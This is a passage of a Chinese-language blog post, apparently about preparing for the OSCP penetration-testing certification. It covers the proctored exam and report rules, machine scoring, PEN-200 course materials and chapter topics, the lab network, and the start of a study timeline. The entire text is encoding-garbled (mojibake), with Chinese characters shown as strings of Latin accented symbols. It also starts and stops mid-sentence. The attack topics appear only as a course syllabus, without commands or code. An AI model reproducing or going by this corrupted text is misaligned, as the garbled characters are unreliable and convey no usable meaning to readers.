±å‘Šï¼Œæ‰€ä»¥ç¸½è¨ˆæ˜¯ä¸€å€‹ 24+24 å°æ™‚çš„è€ƒè©¦ã€‚å› ç‚ºç¾åœ¨æ˜¯ä¸Šæ©Ÿéƒ¨åˆ†å…¨ç¨‹ç›£è€ƒï¼Œæ‰€ä»¥ä½ è¦åœ¨é å®šè€ƒè©¦çš„å‰ 15 åˆ†é˜å…ˆé€²å»ä¸€å€‹ portal è·Ÿè€ƒå®˜æ ¸å°èº«ä»½ã€ç¢ºèªç’°å¢ƒï¼ˆè¦æ‹¿èµ·é›»è…¦è®“ä»–çœ‹åˆ°æ•´å€‹æˆ¿é–“è·Ÿæ¡Œå­ä¸‹ï¼‰ã€é–‹è¢å¹•åˆ†äº«è·Ÿæ”å½±æ©Ÿï¼Œé€™æ™‚é–“å¦‚æœå› ç‚ºè¨­å‚™æˆ–æ˜¯å…¶ä»–å•é¡Œ delay å°±æ˜¯åƒåˆ°ä½ è‡ªå·±çš„è€ƒè©¦æ™‚é–“ï¼Œæ‰€ä»¥å»ºè­°è€ƒå‰è‡ªå·±æ¸¬è©¦ä¸€ä¸‹ã€‚é–‹å§‹è€ƒè©¦å¾Œè€ƒå®˜å…¨ç¨‹æœƒç›¯è‘—ä½ è·Ÿä½ çš„è¢å¹•å€‘çœ‹ï¼Œè¦æš«åœæˆ–æ˜¯ä¸­é›¢éƒ½è¦è·Ÿä»–èªªä¸€è²ï¼Œå›ä¾†ä¹Ÿè¦ã€‚ä¸ç”¨æ“”å¿ƒï¼Œä»–å€‘æœƒè¼ªç­ç›£è€ƒï¼Œä¸æœƒé™ªä½ é€šå®µã€‚</p>\n<p>è€ƒ 24 å°æ™‚è½èµ·ä¾†å¾ˆå¯æ€•ï¼Œä¸éè€ƒè©¦çš„è¨­è¨ˆä¹Ÿä¸æ˜¯è¦ä½  24 å°æ™‚éƒ½åœ¨é›»è…¦å‰é¢æ•²æ•²æ‰“æ‰“ï¼Œä»–æ˜¯æœ‰è€ƒæ…®åˆ°ç¡è¦ºåƒé£¯ä¼‘æ¯é‹å‹•ç­‰æ—¥å¸¸ç”Ÿæ´»çš„ï¼Œä¹‹å‰åœ¨ reddit ä¸Šçœ‹åˆ°æœ‰äººèªªï¼Œè€ƒè©¦è¨­è¨ˆæ˜¯ä½ æ‡‰è©²åœ¨ 12 å°æ™‚å…§å°±å¯ä»¥å®Œæˆçš„ï¼Œæ‰€ä»¥ä¸ç”¨åˆ°å»¢å¯¢å¿˜é£Ÿå•¦ï¼ï¼ˆé›–ç„¶æœƒæƒ³è€ƒé€™å¼µçš„æ‡‰è©²æ‰“ CTF ä¹Ÿå¸¸å¸¸ä¸å°å¿ƒç©åˆ°é€šéœ„ XDDï¼‰</p>\n<p>å¦‚æœä½ æœ‰åˆ°å¯«å ±å‘Šçš„éšæ®µï¼Œæœƒå†æœ‰ 24 å°æ™‚å¯ä»¥å¯«ä¸€ä»½å°ˆæ¥­çš„æ»²é€æ¸¬è©¦å ±å‘Šï¼Œå¯«å®Œå£“ç¸®ä¸Šå‚³åˆ°ä¸€å€‹ç¶²ç«™ï¼Œé€å‡ºå°±ä¸èƒ½å†ä¿®æ”¹ï¼Œæ ¼å¼å…§å®¹æª”åéƒ½ä¸è¡Œã€‚é€™éƒ¨åˆ†å®˜æ–¹æœ‰æä¾›ä¸€å€‹æ¨¡æ¿ï¼Œç¤¾ç¾¤ä¹Ÿæœ‰å¾ˆå¤šæ”¹è‰¯ç‰ˆæœ¬ï¼Œè®“ä½ å¯ä»¥æŠŠè€ƒè©¦æ©Ÿå™¨çš„éç¨‹å¡«æ ¼å­å¡«å¥½ï¼Œå‰å¾Œç½é ­æ–‡å­—éƒ½ä¸ç”¨å‹•ï¼Œå°±ç®—æ˜¯æ²’å¯«éå ±å‘Šçš„ä¹Ÿå¯ä»¥æ»¿ç°¡å–®çš„å®Œæˆã€‚è¦åˆ¥æ³¨æ„çš„æ˜¯ï¼Œå‰é¢ä¸Šæ©Ÿè€ƒçš„æ™‚é–“ä¸€çµæŸä½ å°±å†ä¹Ÿé€²ä¸å»äº†è€ƒè©¦ç’°å¢ƒäº†ï¼Œæ‰€ä»¥ç¼ºæˆªåœ–å°‘æ­¥é©Ÿä¹Ÿæ²’è¾¦æ³•è£œä¸Šï¼Œè«‹åŸ¹é¤Šéš¨æ™‚æˆªåœ–ä¸¦åšç­†è¨˜è¨˜éŒ„æ­¥é©Ÿè·Ÿçµæœçš„ç¿’æ…£ã€‚æˆ‘è‡ªå·±æ˜¯ä¸€é‚Šæ‰“ä¸€é‚Šå¯«ï¼Œæ‰“å®Œä¸€å°å°±æŠŠæ•´å€‹éç¨‹å®Œæ•´å¯«é€²å ±å‘Šè£¡ï¼Œæ‰€ä»¥ä¸Šæ©Ÿè€ƒå®Œå·®ä¸å¤šå°±å¯ä»¥äº¤å ±å‘Šäº†ã€‚</p>\n<p>æ¯å°æ©Ÿå™¨éƒ½æœ‰é…åˆ†ï¼Œåˆ†åˆ¥æ˜¯ 25 25 20 20 10ï¼Œç¸½å…±æ»¿åˆ† 100 åˆ†ï¼Œé€™å€‹é…åˆ†æŒ‡çš„æ˜¯ä½ å¯ä»¥å¾é€™å°æ©Ÿå™¨æ‹¿åˆ°çš„æœ€é«˜åˆ†æ•¸ï¼Œä¹Ÿå°±æ˜¯èªªä¸€å° 25 åˆ†çš„æ©Ÿå™¨ä½ è¦æ‹¿åˆ°æœ€é«˜æ¬Šé™çš„ flag ä¸¦ä¸”å ±å‘Šéƒ½æ²’è¢«æ‰£åˆ†æ‰èƒ½æ‹¿åˆ° 25 åˆ†ï¼Œå¦‚æœä½ åªæ‹¿åˆ°ä½æ¬Šé™çš„ flag æˆ–æ˜¯å ±å‘Šæ²’å¯«å¥½ï¼Œå°±åªæœ‰éƒ¨åˆ†åˆ†æ•¸ç”šè‡³æ²’åˆ†ï¼ˆå ±å‘Šæ˜¯çœ‹å¾—å¾ˆé‡çš„ï¼‰ã€‚æœ€å¾Œå¿…é ˆè‡³å°‘ 70 åˆ†æ‰æœƒé€šéè€ƒè©¦ï¼Œæ‰€ä»¥ä¸Šæ©Ÿå¯ä»¥çš„è©±å¤šæ‹¿ä¸€é»åˆ†æ•¸æ¯”è¼ƒä¿éšªï¼Œå¦‚æœé€£ 70 åˆ†éƒ½æ²’æœ‰ä¹Ÿå°±å¯ä»¥ä¸ç”¨å¯«å ±å‘Šäº†ã€‚å¦å¤–ï¼Œè½èªª lab è·Ÿèª²ç¨‹çš„ exercise å¦‚æœæœ‰åšå®Œç„¶å¾Œå¯«å®Œæ•´çš„ writeup æœ‰æ©ŸæœƒåŠ äº”åˆ†ï¼Œä¸éæˆ‘è¦ºå¾— CP å€¼é —ä½æ‰€ä»¥æ²’åšã€‚</p>\n<h3 id=\"%E8%AA%B2%E7%A8%8B%E8%88%87%E8%A8%AD%E5%82%99\"><a class=\"direct-link\" href=\"#%E8%AA%B2%E7%A8%8B%E8%88%87%E8%A8%AD%E5%82%99\">#</a> èª²ç¨‹èˆ‡è¨­å‚™</h3>\n<p>OSCP çš„è€ƒè©¦æ˜¯è·Ÿèª²ç¨‹ç¶åœ¨ä¸€èµ·çš„ï¼Œä¹Ÿå°±æ˜¯ä½ å ±åçš„æ˜¯ PEN-200 é€™å€‹èª²ç¨‹ç„¶å¾Œæœƒé™„å¸¶è€ƒè©¦æ©Ÿæœƒä¸€æ¬¡ï¼Œå¾ŒçºŒè¦æ˜¯æ²’è€ƒéå¯ä»¥å†è²·è£œè€ƒï¼Œä¸éç¬¬ä¸€æ¬¡æ˜¯ä¸èƒ½åªè²·è€ƒè©¦çš„ã€‚ï¼ˆç¾åœ¨å®˜ç¶²é‚„æœ‰è²· 365 å¤©åŠ è€ƒè©¦æ©Ÿæœƒå…©æ¬¡çš„æ–¹æ¡ˆï¼ŒçœŸçš„æœƒæœ‰äººè²·å—ï¼‰</p>\n<p>é‚£èª²ç¨‹å…§å®¹æœ‰å“ªäº›å‘¢ï¼Ÿç•¶ä½ å ±åä¹‹å¾Œæœƒæ”¶åˆ°æ•™æåŒ…ï¼Œè£¡é¢æœ‰å£“ç¸®å¾Œ 4GB çš„å½±ç‰‡å€‘èˆ‡ 851 é çš„ PDF è¬›ç¾©ï¼Œå½±ç‰‡è·Ÿè¬›ç¾©çš„ç« ç¯€è·Ÿå…§å®¹éƒ½æ˜¯å°æ‡‰çš„ï¼Œå¯ä»¥æƒ³åƒæˆæ˜¯å‹•ç•«æœ‰è²æ›¸ï¼ˆï¼Ÿï¼‰ç„¶å¾Œé‚„æœ‰ç™»å…¥ VPN è·Ÿè«–å£‡çš„ä¸€çµ„å¸³è™Ÿå¯†ç¢¼ã€‚</p>\n<p>é¦–å…ˆï¼Œé–‹å§‹å‰ä½ éœ€è¦æº–å‚™å¹¾æ¨£æ±è¥¿ã€‚</p>\n<p>ç¬¬ä¸€æ˜¯ä¸€å° kaliï¼Œæ•™æåŒ…è£¡é¢å®˜æ–¹æœƒå¯„çµ¦ä½ ä¸€å°èˆŠä¸€é»çš„ç‰ˆæœ¬ï¼Œä¸éæˆ‘æ˜¯ç”¨æˆ‘è‡ªå·±çš„ kaliï¼Œé›–ç„¶æœ‰è½éåˆ¥äººè¨è«–ä¸åŒç‰ˆæœ¬æœ‰äº›å·¥å…·æœƒå‡ºå•é¡Œï¼ˆkali æ˜¯ rolling release æœƒä¸€ç›´æ›´æ–°ï¼‰ï¼Œä¸éæˆ‘è‡ªå·±æ˜¯æ²’é‡åˆ°ä»€éº¼ google ç„¡æ³•è§£æ±ºçš„å•é¡Œå•¦ï¼Œè€ƒè©¦ä¹Ÿå¾ˆé †åˆ©ã€‚</p>\n<p>ç¬¬äºŒæ˜¯åšç­†è¨˜çš„è»Ÿé«”ã€‚æˆ‘ç”¨çš„æ˜¯ kali å…§å»ºçš„ cherrytreeï¼Œä¸éæˆ‘è¦ºå¾—ç”¨è‡ªå·±ç†Ÿæ‚‰çš„å°±è¡Œã€‚è®€è¬›ç¾©è·Ÿç·´ lab çš„æ™‚å€™ï¼Œè¦æœ‰æ¢ç†åœ°æ•´ç†è‡ªå·±å˜—è©¦çš„æ–¹æ³•ã€æ­¥é©Ÿã€æŒ‡ä»¤ã€ç”šè‡³æˆªåœ–ï¼Œä¸ç®¡æ˜¯ä¸æ˜¯è¦å¯« writeupï¼Œç•™å€‹ç´€éŒ„éƒ½å¥½ã€‚èªªä¸å®šè€ƒè©¦çš„æ™‚å€™å‰›å¥½é‡åˆ°ä¸€å€‹ä¼¼æ›¾ç›¸è­˜çš„ç‹€æ³ï¼Œé€™æ™‚å€™æœ‰ç­†è¨˜è·Ÿæ­¥é©Ÿå°±æœƒè®“ä½ å®‰å¿ƒè¨±å¤šï¼Œè€Œä¸”å¹³æ™‚å°±åŸ¹é¤Šåšå¥½ç­†è¨˜çš„ç¿’æ…£ï¼Œè€ƒè©¦ä¹Ÿä¸å®¹æ˜“æ±æ¼è¥¿æ¼æœ€å¾Œé‚„è¦å›å»ä¸€ç›´è£œæ´ã€‚</p>\n<p>è€ƒè©¦çš„è©±ï¼Œæ’å¥½æ™‚è¾°ä¹‹å¾Œä½ æœƒæ”¶åˆ°ä¸€å°ä¿¡å‘Šè¨´ä½ éœ€è¦æº–å‚™å“ªäº›æ±è¥¿è·Ÿä¸€å€‹ FAQ ç¶²å€ã€‚è¨­å‚™ä¸å¤–ä¹å°±æ˜¯ï¼š</p>\n<ul>\n<li>é¡é ­ï¼šæˆ‘ç”¨ mac çš„å…§åµŒé¡é ­ä½†ä¹Ÿå¯ä»¥å¤–æ¥ï¼Œç•«è³ªè¦è®“è€ƒå®˜å¯ä»¥æ¸…æ¥šçœ‹è¦‹ä½ çš„èº«ä»½è­‰æ˜æ–‡ä»¶</li>\n<li>é‚„ç®—é€šé †çš„ç¶²è·¯ï¼šå®˜æ–¹çµ¦ä½ çš„ VPN åŒ…æœƒé™„èªªæ˜è·Ÿä½ èªª ping time å¤šå°‘æ¯”è¼ƒå¥½ï¼Œæˆ‘å¹³å¸¸åœ¨å®¶ç·´ lab å¤§æ¦‚æ˜¯ä¸‹è¼‰ä¸Šå‚³ 16Mbps/3Mbpsï¼Œé™¤äº† RDP è·Ÿ tunneling ä¹‹å¾Œæœ‰ä¸€é»å¡ä¹‹å¤–å¤§è‡´ä¸Šéƒ½é‚„è¡Œï¼Œä¸éè€ƒè©¦çš„æ™‚å€™é™¤äº† VPN é‚„è¦åˆ†äº«é¡é ­è·Ÿè¢å¹•ï¼Œå…¨ç¨‹è¦–è¨ŠçœŸçš„æ˜¯æœƒ lagï¼Œæ‰€ä»¥æˆ‘æ˜¯åˆ°å­¸æ ¡ç”¨è¶…é«˜é€Ÿç¶²è·¯ XDD æˆ‘è¦ºå¾—ä¿å®ˆä¸€é»ä¸€èˆ¬ 100Mbps/60Mbps æ‡‰è©²å°±å¾ˆé †æš¢äº†ã€‚</li>\n<li>èº«ä»½è­‰æ˜æ–‡ä»¶ï¼šæ”¿åºœç™¼è¡Œçš„è­‰ä»¶ï¼Œä½†å¿…é ˆæ˜¯è‹±æ–‡çš„ï¼Œæ‰€ä»¥å°ç£äººæ‡‰è©²åªèƒ½ç”¨è­·ç…§äº†å§ï¼ˆï¼Ÿï¼‰æ³¨æ„é€™å€‹è¦è·Ÿä½ è¨»å†Šçš„åå­—ä¸€æ¨£ï¼ï¼</li>\n</ul>\n<h3 id=\"%E8%AA%B2%E7%A8%8B%E5%85%A7%E5%AE%B9\"><a class=\"direct-link\" href=\"#%E8%AA%B2%E7%A8%8B%E5%85%A7%E5%AE%B9\">#</a> èª²ç¨‹å…§å®¹</h3>\n<p>è¬›ç¾©çš„éƒ¨åˆ†å…§å®¹ä¾æ“šç« ç¯€é †åºå¤§æ¦‚æ˜¯ï¼š</p>\n<ol>\n<li>ä»‹ç´¹ PWK(PEN-200)ï¼šåŒ…å«èª²ç¨‹ã€ç’°å¢ƒã€å ±å‘Šã€è€ƒè©¦è¦ç¯„ç­‰ç­‰</li>\n<li>åŸºç¤\n<ol>\n<li>Kali æ•™å­¸ï¼šæ€éº¼å®‰è£è·Ÿä½¿ç”¨ kali linuxï¼Œé‚„æœ‰ command line æ•™å­¸</li>\n<li>å·¥å…·ä»‹ç´¹ï¼šnetcat, powershell, wireshark ç­‰ç­‰å¸¸ç”¨å·¥å…·</li>\n<li>å¯«ç°¡å–®çš„ bash script</li>\n</ol>\n</li>\n<li>è³‡æ–™æ”¶é›†ï¼š\n<ol>\n<li>Passive recon: google hacking, email password dump...</li>\n<li>Active recon ï¼ˆå„ç¨®æœå‹™çš„è³‡è¨Šæ”¶é›†ï¼‰\n<ol>\n<li>port scanning</li>\n<li>DNS, SMB, NFS, SMTP, SNMP ç­‰ç­‰çš„æšèˆ‰æŠ€å·§</li>\n</ol>\n</li>\n<li>Vulnerability scanning</li>\n</ol>\n</li>\n<li>ç¶²é æ”»æ“Šï¼š\n<ol>\n<li>æ‰‹å‹•å‹˜æŸ¥ã€å·¥å…·ä½¿ç”¨</li>\n<li>XSS, Directory traversal, File inclusion, SQL injection...</li>\n</ol>\n</li>\n<li>Buffer Overflow (Windows + Linux)ï¼šæœ€ç°¡å–®çš„é‚£ç¨®ï¼Œé€£ NX éƒ½æ²’é–‹ï¼Œreturn address + shellcode çµæŸé€™ä¸€å›åˆ</li>\n<li>Client-Side Attacks: HTA, Microsoft Word...ï¼ˆæƒ¡æ„è»Ÿé«”å¯¦ä½œå…¥é–€ XDDï¼‰</li>\n<li>å°‹æ‰¾ã€ä¿®æ”¹ã€ç·¨è­¯ã€ä½¿ç”¨ public exploit</li>\n<li>file transfer çš„æŠ€å·§</li>\n<li>é¿é–‹é˜²æ¯’è»Ÿé«”</li>\n<li>ææ¬Šï¼ˆPrivilege Escalationï¼‰</li>\n<li>çˆ†å¯†ç¢¼</li>\n<li>port forwarding è·Ÿ tunneling çš„å°æŠ€å·§</li>\n<li>Active Directory (AD)</li>\n<li>Metasploit è·Ÿ Powershell Empire æ•™å­¸</li>\n<li>å®Œæ•´æ»²é€æ¸¬è©¦çš„ä¸€æ¬¡ walkthrough</li>\n</ol>\n<p>åŸºæœ¬ä¸Šï¼Œå¦‚æœä¸æ˜¯å®Œå…¨æ²’æœ‰ä¸€é»è³‡è¨ŠèƒŒæ™¯ï¼Œæˆ‘è¦ºå¾—å¯ä»¥è·³éç¬¬äºŒæ®µåŸºç¤çš„éƒ¨åˆ†ã€‚ç„¶å¾Œå¦‚æœæ˜¯ç´”ç²¹ç‚ºäº†çŸ­æ™‚é–“å…§é€šéè€ƒè©¦ï¼Œå¯ä»¥å…ˆè·³é passive reconã€client-side attackã€é˜²æ¯’ã€port forwardingã€ADã€Metasploitï¼ˆç¦ç”¨ï¼‰é€™äº›ç« ç¯€ï¼Œæ‰£æ‰é›¶é›¶ç¸½ç¸½å¤§æ¦‚å‰© 3/5 çš„å…§å®¹ã€‚é›–ç„¶æ‰£é™¤çš„éƒ¨åˆ†éƒ½é‚„è »æœ‰è¶£è€Œä¸”ç¾å¯¦ä¸­ä¹Ÿå¯¦ç”¨ï¼Œä¸éå› ç‚ºè€ƒè©¦ä¸­ä¸æœƒ/ä¸èƒ½å‡ºç¾ï¼Œæ‰€ä»¥è¶•æ™‚é–“çš„æœ‹å‹å¯ä»¥é‡é»ç·´ä¸‹é¢å¹¾å€‹æŠ€å·§ï¼š</p>\n<ul>\n<li>Active recon</li>\n<li>ç¶²é æ”»æ“Š</li>\n<li>public exploit</li>\n<li>file transfer</li>\n<li>ææ¬Šï¼ˆPrivilege Escalationï¼‰</li>\n</ul>\n<p>æˆ‘è‡ªå·±å› ç‚ºåœ¨å ±å OSCP ä¹‹å‰ç©äº†å¥½ä¸€é™£å­çš„ Hack The Box (HTB)ï¼Œæ‰€ä»¥å°èª²ç¨‹ä¸»é¡Œéƒ½æœ‰ä¸€é»ç†Ÿæ‚‰åº¦äº†ï¼Œè¬›ç¾©å½±ç‰‡é€™é‚ŠåªèŠ±äº†å…©ä¸‰å¤©å¿«é€Ÿçœ‹éåŠ è£œè¶³ä¸€äº›æ²’çœ‹éçš„æŠ€å·§ã€‚ä¾æ“š reddit ä¸Šçš„è¨è«–ï¼Œå¦‚æœæ˜¯å®Œå…¨æ²’æ¥è§¸éçš„è©±ï¼Œå»ºè­°æŠŠè¬›ç¾©å¾é ­è®€ä¸€éï¼ˆæˆ–æ˜¯çœ‹å®Œå½±ç‰‡ï¼‰ä¸¦æ•´ç†è‡ªå·±çš„ç­†è¨˜ï¼Œexercise ä¹Ÿå¯ä»¥é¸è‘—åšä¸€äº›ï¼›æœ‰é»åŸºç¤çš„è©±ï¼Œé‚„æ˜¯å¯ä»¥æ­é…è¬›ç¾©è·³è‘—çœ‹ä¾†è£œå……æ•´ç†ä¸€ä¸‹å±¬æ–¼è‡ªå·±çš„ç­†è¨˜ï¼Œé›–ç„¶å…§å®¹å¯èƒ½å¾ˆå†—é•·ï¼Œä½†æ˜¯å®˜æ–¹èª²ç¨‹å…§å®¹çš„å„ªé»å°±æ˜¯çœŸçš„è¬›å¾—å¾ˆä»”ç´°ï¼Œé›–ç„¶ä¸æ·±ä½†ç®—æ˜¯å¾ˆå…¨é¢çš„ä»‹ç´¹ï¼Œç•¶ä½œæ˜¯è¤‡ç¿’ä¸€ä¸‹ä¹Ÿä¸éŒ¯ï¼Œå¶è€Œé‚„æ˜¯æœƒæˆ³åˆ°ä¸€äº›æ²’é‚£éº¼æ¸…æ¥šæˆ–æ˜¯ä¸æ‡‚çš„é»ã€‚è¬›ç¾©çš„æ¯å€‹å°ç« ç¯€éƒ½æœƒæœ‰ä¸€äº› exercise è®“ä½ å‹•æ‰‹ç·´ç¿’ï¼ˆlab è£¡é¢æœƒæœ‰ä½ å°ˆå±¬çš„ client machine å¯ä»¥ç”¨ï¼‰ï¼Œé€™éƒ¨åˆ†å¦‚æœæœ‰å…¨éƒ¨åšå®Œç„¶å¾Œå¯« writeup å°±å¯ä»¥é¡å¤–åŠ åˆ†ï¼Œä¸éæˆ‘ä¹Ÿæ²’å¾é ­è®€å®Œï¼Œæ‰€ä»¥å°±æ²’åšé€™å¡Šã€‚</p>\n<p>æˆ‘è‡ªå·±è¦ºå¾—æœ€é‡è¦æœ€æœ‰å¹«åŠ©çš„å…¶å¯¦æ˜¯æœ€å¾Œä¸€ç« å¸¶ä½ åšä¸€æ¬¡æ»²é€æ¸¬è©¦çš„éƒ¨åˆ†ï¼ˆåœ¨ lab è£¡é¢ä¹Ÿå¯ä»¥è·Ÿè‘—åšä¸€æ¬¡ï¼‰ã€‚é€™æ®µæœƒçµ¦ä½ ä¸€å°å…¥å£æ©Ÿå™¨ï¼Œç„¶å¾Œæ•™ä½ å¦‚ä½•æšèˆ‰å¦‚ä½•é¸æ“‡ attack vector å±¤å±¤æ¨é€²ï¼Œæœƒæ·±å…¥å¥½å¹¾å±¤å…§ç¶²æœ€å¾Œæ‹¿ä¸‹ ADï¼ŒåŸºæœ¬ä¸Šè¬›ç¾©å…§æ‰€æœ‰é¡å‹çš„æŠ€å·§éƒ½æœƒç”¨åˆ°ã€‚</p>\n<p>é›–ç„¶å€‹åˆ¥çš„æŠ€å·§éƒ½æœƒç”¨ï¼Œä½†æ˜¯æˆ‘ä¸€ç›´è¦ºå¾—è‡ªå·±ç¼ºå°‘ä¸€å€‹æ˜ç¢ºçš„æ–¹æ³•è«–è·Ÿåšæ»²é€çš„ SOP ä¾†æœ€æœ‰æ•ˆç‡çš„ä¸²å‡ºæ”»æ“ŠéŠï¼Œä¸€çœ‹åˆ°æ©Ÿæœƒå°±è¦‹çµå¿ƒå–œçš„è¡é€²å»ï¼Œè©¦äº†åŠå¤©æ‰ç™¼ç¾æ­»è·¯ä¸€æ¢ã€‚</p>\n<blockquote>\n<p>æˆ‘è¦ºå¾—é€™é–€èª²å¦ä¸€å€‹å¾ˆé‡è¦çš„ç›®çš„æ˜¯å»ºç«‹ä¸€å¥—ç©©å®šçš„ä¸­å¿ƒæ€æƒ³ï¼Œè®“ä½ åœ¨çœŸçš„æ»²é€çš„æ™‚å€™èƒ½æœ‰è¨ˆç•«è·Ÿé‚è¼¯çš„é€²è¡Œæ”»æ“Šï¼Œè€Œä¸æ˜¯äº‚æ§æ‰“é³¥ã€‚</p>\n</blockquote>\n<p>é™„å¸¶ä¸€æï¼Œlab è£¡é¢æœ‰å…©å°æ©Ÿå™¨æœ‰å®˜æ–¹çš„ writeupï¼Œä¹Ÿæ˜¯éå¸¸é‡è¦çš„è³‡æºï¼Œå»ºè­°ä¸€å®šçœ‹éæƒ³éä¸€éï¼Œæœƒçœå¾ˆå¤šèµ°æ­ªè·¯çš„æ™‚é–“ã€‚å†æä¸€é»ï¼Œæ—¢ç„¶é€™é–€èª²å¸Œæœ›å»ºç«‹ä½ çš„æ–¹æ³•è«–ï¼Œè€ƒè©¦æ©Ÿå™¨å°±å‹¢å¿…æœƒé–‹å¾ˆå¤šèª˜é¤Œæœå‹™ä¾†èª¤å°ä½ ï¼Œåšå¥½æ™‚é–“æ§ç®¡ä¸¦ä¸”å­¸æœƒåˆ¤æ–·å“ªäº›æ‰æ˜¯çœŸçš„ meaty å¾ˆé—œéµã€‚</p>\n<h3 id=\"lab\"><a class=\"direct-link\" href=\"#lab\">#</a> Lab</h3>\n<p>Lab ç’°å¢ƒå°±æ˜¯æ¨¡æ“¬ä¸€æ•´å€‹ä¼æ¥­çš„ç¶²è·¯ï¼Œå¤§æ¦‚é•·å¾—åƒä¸‹é¢é€™å¼µåœ–ï¼Œå¤–å±¤æ˜¯ä½ ç”¨ VPN é€£éå»å°±å¯ä»¥ç›´æ¥ access çš„ public networkï¼Œé‚„æœ‰å¿…éœ€é€é tunneling æ‰å¯ä»¥é€£åˆ°çš„å…§éƒ¨ç¶²è·¯ IT DEV ADMIN éƒ¨é–€ã€‚é€™å€‹ç¶²è·¯æ˜¯è·Ÿå…¶ä»–å­¸ç”Ÿå…±ç”¨çš„ï¼Œæ‰€ä»¥æ¯ä¸€å°æ‰“ä¹‹å‰å»ºè­°å…ˆ reset ï¼Œä¸ç„¶æœ‰æ™‚å€™è¢«åˆ¥äººå¼„å£äº†æˆ–æ˜¯æ”¹äº†è¨­å®šå°±æœƒç™½è²»æ™‚é–“ï¼Œæˆ–æ˜¯å¶çˆ¾è§£ä¸€è§£çœ‹åˆ°å…¶ä»–äººç•™ä¸‹ä¾†çš„ç—•è·¡ç„¶å¾Œè¢«æš´é›· XDD</p>\n<p>ä¸‹é¢çš„ private segment æ˜¯æ¯å€‹äººæœƒæœ‰ä¸‰å°å°ˆå±¬çš„æ©Ÿå™¨ï¼Œåˆ†åˆ¥æ˜¯ä¸€å° linux ä¸€å° win10 è·Ÿä¸€å° windows serverï¼Œä¸»è¦æ˜¯åœ¨è¬›ç¾© exercise çš„æ™‚å€™è®“ä½ å¯¦ä½œç·´ç¿’ç”¨çš„ã€‚é€™ä¸‰å°æ©Ÿå™¨è¦è‡ªå·± reset æ‰æœƒ spin èµ·ä¾†ï¼Œä¸¦åœ¨ VPN æ–·æ‰å¾Œä¹Ÿæœƒé—œæ‰ã€‚æˆ‘è‡ªå·±æ˜¯åªæœ‰ç”¨åˆ° win10 ä¾†åš windows çš„ BOFï¼Œå› ç‚ºè€ƒè©¦çš„æ™‚å€™ä¸€å®šæœƒæœ‰ä¸€é¡Œ 25 åˆ†çš„ BOFï¼Œç„¶å¾Œå®˜æ–¹ä¹Ÿæœƒçµ¦ä½ ä¸€å° debugging machineï¼Œæ‰€ä»¥é‚„æ˜¯è€ƒå‰ç·´ç¿’ä¸€ä¸‹æ€éº¼ç”¨é‚£å€‹è»Ÿé«”æ¯”è¼ƒä¿éšª XDDD</p>\n<p><figure><img src=\"/img/posts/crystal/oscp/lab-env.png\" /><figcaption><p>Lab ç’°å¢ƒ</p>\n</figcaption></figure></p>\n<p>æˆªè‡³ 2021/08/19 ï¼ˆæˆ‘çš„æœ€å¾Œä¸€å¤©ï¼‰ç‚ºæ­¢ï¼Œä¸ç®—è¬›ç¾©ä¸­å¸¶ä½ åšçš„æ¨¡æ“¬æ¸¬è©¦çš„è©±ï¼Œç¸½å…±æœ‰ 70 å°æ©Ÿå™¨ï¼Œæ“šå®˜æ–¹æ‰€èªªå…¶ä¸­é‚„æœ‰ç´„ 5~8 å°å‰è€ƒè©¦æ©Ÿã€‚</p>\n<p>ä½ çš„ VPN å¸³è™Ÿå¯†ç¢¼ä¹Ÿæœƒç”¨ä¾†ç™»å…¥ä¸€å€‹å­¸ç”Ÿå°ˆç”¨çš„è«–å£‡ï¼Œè£¡é¢æœ‰åˆ†é–€åˆ¥é¡çš„è¨è«–å€ï¼Œå¤§è‡´ä¸ŠåŠƒåˆ†æˆæ©Ÿå™¨å€ã€æ•™æå€ã€å…¶ä»–å•é¡Œå€ã€‚ä½ å¯ä»¥åœ¨è£¡é¢è·Ÿå…¶ä»–åŒå­¸é‚„æœ‰æ ¡å‹äº¤æµï¼Œä¸éå¦‚æœå°é¡Œç›®æš´é›·å¤ªå¤šæœƒè¢«ç®¡ç†å“¡åˆªé™¤å­—å¥ï¼Œæ‰€ä»¥å¾ˆå¤šæç¤ºéƒ½æœƒè¬›å¾—å¾ˆéš±æ™¦ã€‚é™¤äº†è€ƒè©¦æ©Ÿå™¨ï¼Œä»»ä½•ç›¸é—œå•é¡Œéƒ½èƒ½å•ï¼Œä¸ç®¡æ˜¯æŠ€è¡“ç›¸é—œæˆ–æ˜¯é—œæ–¼è€ƒè©¦éœ€è¦çš„ç¡¬é«”è¨­å‚™ç­‰ç–‘é›£é›œç—‡å¹¾ä¹éƒ½æœƒæœ‰äººå›æ‡‰ã€‚</p>\n<h2 id=\"%E6%80%8E%E9%BA%BC%E6%BA%96%E5%82%99\"><a class=\"direct-link\" href=\"#%E6%80%8E%E9%BA%BC%E6%BA%96%E5%82%99\">#</a> æ€éº¼æº–å‚™</h2>\n<p>å¤§å®¶æœ€æƒ³çŸ¥é“çš„ç•¶ç„¶æ˜¯ï¼šæˆ‘åˆ°åº•è©²æ€éº¼æº–å‚™ï¼Ÿå…ˆè®“æˆ‘è¬›è¬›è‡ªå·±çš„ç¶“é©—å†ä»‹ç´¹ä¸€äº›è³‡æºçµ¦å¤§å®¶ã€‚</p>\n<p>æˆ‘æ±ºå®šè¦è€ƒ OSCP çš„æ™‚å€™è¢«å„ç¨®è©•è«–åš‡å¾—ä¸è¼•ï¼Œæ‰€ä»¥è¦åŠƒäº†åŠå¹´ä¾†æº–å‚™ï¼Œæ•´é«”ä¾†èªªå¾äºŒæœˆåŠªåŠ›åˆ°å…«æœˆåº•è€ƒè©¦ã€‚äºŒæœˆé–‹å§‹ï¼Œæˆ‘å¤§æ¦‚æ¯é€±èŠ± 16 å°æ™‚ç·´ Hack The Box (HTB) ä¸Šé¢çš„é¡Œç›®ï¼Œç„¶å¾Œå› ç‚ºæƒ³è¦åšå®Œ lab ç›´æ¥è€ƒï¼Œæ‰€ä»¥æˆ‘åœ¨å…­æœˆåº•å·¦å³å ±å 60 å¤©çš„ labï¼Œæœ€å¾Œå…«æœˆåº•è€ƒå®Œç•¢æ¥­ã€‚</p>\n<h3 id=\"2~6%E6%9C%88-htb\"><a class=\"direct-link\" href=\"#2~6%E6%9C%88-htb\">#</a> 2~6æœˆ HTB</h3>\n<p>HTB æ˜¯ä¸€å€‹å¾ˆé…·çš„ç·´ç¿’å¹³å°ï¼Œä¸Šé¢é™¤äº†æœ‰éå¸¸å¤§é‡çš„ machines ä¹‹å¤–é‚„æœ‰ CTF jeopardy style çš„é¡Œç›®ã€å°ˆæ”»æŸäº›æŠ€è¡“çš„ tracksã€ä¸€ç³»åˆ— AD æ©Ÿå™¨çš„ 